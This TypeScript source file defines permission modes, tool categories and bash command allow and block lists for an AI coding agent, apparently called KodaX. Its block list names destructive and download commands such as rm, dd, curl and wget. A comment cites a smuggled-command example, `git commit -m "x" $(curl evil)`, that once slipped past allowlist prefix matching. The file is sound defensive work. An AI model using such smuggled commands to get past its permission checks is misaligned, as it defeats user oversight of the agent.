/**
 * Permission Types
 */

import type { BashPrefixExtractor } from '@kodax-ai/coding';
import { listBuiltinToolDefinitions } from '@kodax-ai/coding';

// ============== Permission Mode ==============

/**
 * Permission mode
 * - plan: Read-only planning, all modifications blocked unless explicitly whitelisted
 * - accept-edits: File edits auto-approved, shell commands require confirmation
 * - auto: All tools auto-approved (with optional LLM classifier review when
 *         auto-mode engine === 'llm'; FEATURE_092 v0.7.33). When engine === 'rules',
 *         falls back to the legacy "all tools approved within project, outside
 *         requires confirmation" behavior — i.e., the v0.7.32 `auto-in-project`
 *         shape. The `auto-in-project` name is preserved as a deprecated alias
 *         for 5 minor versions (removed in v0.7.38).
 */
export type PermissionMode = "plan" | "accept-edits" | "auto" | "auto-in-project";

export const PERMISSION_MODES: PermissionMode[] = [
  "plan",
  "accept-edits",
  "auto",
  "auto-in-project", // deprecated alias; behavior identical to 'auto'
];

/**
 * Canonical mode names that should appear in user-facing UI / Shift-Tab
 * cycling (excludes deprecated aliases).
 */
export const CANONICAL_PERMISSION_MODES: PermissionMode[] = [
  "plan",
  "accept-edits",
  "auto",
];

/**
 * Returns true when `mode` is the auto family (canonical 'auto' or the
 * deprecated 'auto-in-project' alias). Use this in conditional branches
 * that need to detect auto-mode without binding to either spelling.
 */
export function isAutoMode(mode: PermissionMode): boolean {
  return mode === "auto" || mode === "auto-in-project";
}

/**
 * Map legacy mode names to their canonical form. v0.7.33: auto-in-project → auto.
 * Use at value-read boundaries (settings load, persisted session restore) so
 * downstream code only ever sees canonical names.
 */
export function canonicalizePermissionMode(mode: PermissionMode): PermissionMode {
  return mode === "auto-in-project" ? "auto" : mode;
}

/**
 * Status-bar display name for a permission mode. Title-Case short labels
 * (mirrors Claude Code's `shortTitle` convention in
 * `src/utils/permissions/PermissionMode.ts`):
 *   - `plan`             → `Plan`
 *   - `accept-edits`     → `Edits`
 *   - `auto`             → `Auto`
 *   - `auto-in-project`  → `Auto`  (deprecated alias folds into the canonical
 *                                   display name; the deprecation notice
 *                                   surfaces once per session at startup)
 *
 * Single source of truth — both the readline status-bar
 * (`packages/repl/src/interactive/status-bar.ts`) and the Ink view-model
 * (`packages/repl/src/ui/view-models/status-bar.ts`) consume this so the two
 * surfaces never drift on capitalization or short-form choice.
 */
export function permissionModeDisplayName(mode: PermissionMode): string {
  switch (mode) {
    case "plan":
      return "Plan";
    case "accept-edits":
      return "Edits";
    case "auto":
    case "auto-in-project":
      return "Auto";
  }
}

// ============== Deprecated alias soft-warning (FEATURE_092 phase 2b.7b slice E) ==============

/**
 * One-line user-facing notice surfaced when the user explicitly chooses
 * `auto-in-project` (either at REPL startup from `~/.kodax/config.json` or
 * via `/mode auto-in-project`). The alias is preserved for 5 minor versions
 * for backward compat — design doc validation §4 requires the warning emit
 * once per session, not per-call.
 */
export const AUTO_IN_PROJECT_DEPRECATION_MSG =
  '[deprecated] permissionMode "auto-in-project" is now an alias for "auto" (FEATURE_092, v0.7.33). '
  + 'The alias will be removed in v0.7.38 — please update ~/.kodax/config.json to use "auto".';

/**
 * Build a once-per-session emitter for the auto-in-project deprecation
 * notice. The factory shape (vs. a module-scoped `let emitted = false`)
 * makes the once-semantics testable without resetting module state and
 * lets the REPL own the lifecycle (one emitter per session).
 *
 * `printer` defaults to `console.warn` so the warning lands on stderr —
 * doesn't pollute piped stdout (e.g. `kodax | jq`).
 */
export function createAutoInProjectDeprecationEmitter(
  printer: (msg: string) => void = console.warn,
): () => void {
  let emitted = false;
  return () => {
    if (emitted) return;
    emitted = true;
    printer(AUTO_IN_PROJECT_DEPRECATION_MSG);
  };
}

// ============== Confirm Result ==============

export interface ConfirmResult {
  confirmed: boolean;
  always?: boolean;
}

// ============== Tool Categories ==============
//
// v0.7.42 — these two sets are now COMPUTED from `LocalToolDefinition.
// sideEffect` metadata declared on each tool in
// `packages/coding/src/tools/registry.ts`. Previously they were hardcoded
// at this file (`new Set(["write", "edit"])`), which silently drifted
// every time a new write-class tool was added to KodaX — `multi_edit`,
// `insert_after_anchor`, `worktree_*`, `scaffold_*`, `stage_*` and
// friends were all missing from the original sets, so plan-mode and
// gitRoot tracking under-enforced for years.
//
// The snapshot is taken at module load. `listBuiltinToolDefinitions()`
// returns the static built-in roster (extensions / constructed tools
// register AFTER module evaluation and are intentionally excluded —
// these sets describe the KodaX-shipped surface only).
//
// SDK consumers (KodaX Space etc.) and new internal callsites should
// prefer the metadata API directly:
//   - `isToolFileMutation(name)` / `isToolMutation(name)` /
//     `isToolPlanModeAllowed(name)` from `@kodax-ai/coding`
//   - `getAllRegisteredTools().filter(t => t.sideEffect === '…')`
// The sets below are retained for back-compat with existing callsites
// in REPL / executor / InkREPL / src/acp_server.

const _builtinSnapshot = listBuiltinToolDefinitions();

/**
 * Tools that mutate the local filesystem AND accept a `path` input.
 * Eligible for plan-mode's path-aware escape (writes to
 * `.agent/plan_mode_doc.md` or the system temp dir are permitted; all
 * other paths block).
 *
 * Derived from metadata: `sideEffect === 'mutates-fs'` AND
 * `requiredParams.includes('path')`. Tools that mutate the FS without a
 * `path` input (`undo`, `worktree_*`, construction-staircase tools) are
 * NOT in this set — their plan-mode block reason is computed elsewhere
 * via `isToolPlanModeAllowed()` instead of a path check.
 */
export const FILE_MODIFICATION_TOOLS: Set<string> = new Set(
  _builtinSnapshot
    .filter((tool) => tool.sideEffect === 'mutates-fs' && tool.requiredParams.includes('path'))
    .map((tool) => tool.name),
);

/**
 * All tools with any observable side effect (`sideEffect !== 'readonly'`).
 *
 * Historically used as the plan-mode block set; today
 * `isToolPlanModeAllowed(name)` from `@kodax-ai/coding` is the canonical
 * gate (it honors `planModeAllowed: true` overrides for tools whose
 * effect is itself part of the planning loop, e.g. `exit_plan_mode` /
 * `task_stop` / `todo_*` / `ask_user_question`). Retained as a derived
 * back-compat alias.
 */
export const MODIFICATION_TOOLS: Set<string> = new Set(
  _builtinSnapshot.filter((tool) => tool.sideEffect !== 'readonly').map((tool) => tool.name),
);

/**
 * Bash commands that have write side-effects (blocked in plan mode).
 *
 * This is a blacklist approach: only explicitly listed commands are blocked here.
 * Additional write detection for redirection and PowerShell cmdlets lives in
 * `permission.ts`.
 */
export const BASH_WRITE_COMMANDS = new Set([
  // Package managers
  "npm install", "npm i", "npm uninstall", "npm remove", "npm update", "npm ci",
  "yarn add", "yarn remove", "yarn upgrade",
  "pnpm add", "pnpm remove", "pnpm update",

  // Git write operations
  "git clean", "git reset", "git checkout", "git switch", "git merge", "git rebase",
  "git cherry-pick", "git revert", "git commit", "git push", "git pull",

  // File operations
  "rm", "mv", "cp", "mkdir", "rmdir", "touch", "chmod", "chown",
  "del", "erase", "rd", "copy", "move", "ren",

  // Download/create
  "curl", "wget", "dd", "tar",

  // Process control
  "kill", "pkill", "killall",
]);

/**
 * Strict whitelist of bash commands considered safe for read-only exploration in plan mode.
 * Any bash command not matching these bases will require user confirmation.
 */
export const BASH_SAFE_READ_COMMANDS = new Set([
  // Basic shell inspection
  "ls", "cat", "pwd", "echo", "whoami", "date", "which", "whereis", "tree",
  "dir", "type", "get-childitem", "get-content", "select-string", "get-location",
  "where",

  // Search and find
  "grep", "find", "awk", "sed", "head", "tail", "less", "more", "wc",
  "findstr", "fc",

  // Git operations (read-only) — FEATURE_158 added tag / stash list /
  // describe / config --get to close the Issue 131 reproduction.
  "git status", "git diff", "git log", "git show", "git branch",
  "git remote", "git ls-files", "git rev-parse", "git grep",
  "git tag", "git stash list", "git describe", "git config --get",

  // Language toolchains (version/info only)
  "node", "npm", "yarn", "pnpm", "tsc", "python", "pip", "go", "cargo", "rustc",
]);

// ============== Permission Context ==============

export interface PermissionContext {
  permissionMode: PermissionMode;
  confirmTools: Set<string>;
  gitRoot?: string;
  alwaysAllowTools: string[];
  onConfirm?: (tool: string, input: Record<string, unknown>) => Promise<ConfirmResult>;
  saveAlwaysAllowTool?: (tool: string, input: Record<string, unknown>, allowAll?: boolean) => void;
  switchPermissionMode?: (mode: PermissionMode) => void;
  beforeToolExecute?: (tool: string, input: Record<string, unknown>) => Promise<boolean | string>;
  /**
   * FEATURE_153 (v0.7.38) — Optional LLM-backed bash command prefix extractor.
   * When supplied, `isToolCallAllowed` uses it to extract the SAFE PREFIX of
   * a bash command before matching against allowlist patterns like
   * `Bash(git commit:*)`. This eliminates the pre-FEATURE_153 vulnerability
   * where `git commit -m "x" $(curl evil)` matched the allowlist via naive
   * `command.startsWith` semantics.
   *
   * KodaX REPL bootstrap creates this via `createBashPrefixExtractor` from
   * `@kodax-ai/coding` and threads it here. SDK consumers / tests without
   * LLM access can omit it; legacy startsWith semantics apply (documented
   * as insecure in `matchesBashPatternLegacy`).
   */
  bashPrefixExtractor?: BashPrefixExtractor;
}

/**
 * Compute the base confirmation set for each permission mode.
 *
 * Note: `plan` still lists the standard mutating tools here even though most of
 * them are blocked earlier in the permission pipeline via `getPlanModeBlockReason`.
 * This helper only describes the remaining confirmation step for calls that are
 * not hard-blocked.
 */
export function computeConfirmTools(mode: PermissionMode): Set<string> {
  switch (mode) {
    case "plan":
      return new Set(["bash", "write", "edit", "undo"]);
    case "accept-edits":
      return new Set(["bash"]);
    case "auto":
    case "auto-in-project":
      return new Set();
  }
}

export function isPermissionMode(value: string | undefined): value is PermissionMode {
  return value !== undefined && PERMISSION_MODES.includes(value as PermissionMode);
}

export function normalizePermissionMode(
  value: string | undefined,
  fallback?: PermissionMode,
): PermissionMode | undefined {
  if (isPermissionMode(value)) {
    return value;
  }

  return fallback;
}
